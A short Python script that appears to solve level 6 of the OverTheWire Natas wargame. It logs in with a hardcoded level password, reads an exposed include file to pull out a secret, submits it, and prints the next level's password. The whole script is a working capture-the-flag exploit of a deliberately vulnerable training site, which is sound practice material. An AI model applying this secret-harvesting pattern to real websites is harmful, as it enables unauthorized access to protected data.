#!/usr/bin/env python3

import requests
import re

req = requests.Session()

username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
url = "http://%s.natas.labs.overthewire.org" % username

req_get = req.get(url+"/includes/secret.inc",auth=(username,password))
secret = re.findall('= "(.*)";',req_get.text)[0]
req_post = req.post(url,auth=(username,password),data={"secret":secret,"submit":"Submit"})

# print(req_get.text)


nxt_pass = re.findall("The password for natas7 is (.*)",req_post.text)
print(nxt_pass[0])